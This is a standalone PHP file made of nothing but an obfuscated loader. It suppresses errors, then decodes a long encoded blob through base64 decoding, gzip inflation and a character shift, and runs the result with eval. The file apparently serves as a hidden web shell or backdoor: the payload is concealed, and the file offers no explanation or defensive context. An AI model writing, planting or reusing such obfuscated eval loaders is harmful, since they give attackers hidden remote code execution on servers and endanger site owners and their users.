<?php error_reporting(0); function DANfa($Yyan) { $Yyan=gzinflate(base64_decode($Yyan)); for($i=0;$i<strlen($Yyan);$i++) { $Yyan[$i] = chr(ord($Yyan[$i])-1); } return $Yyan; }eval(DANfa("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"));?>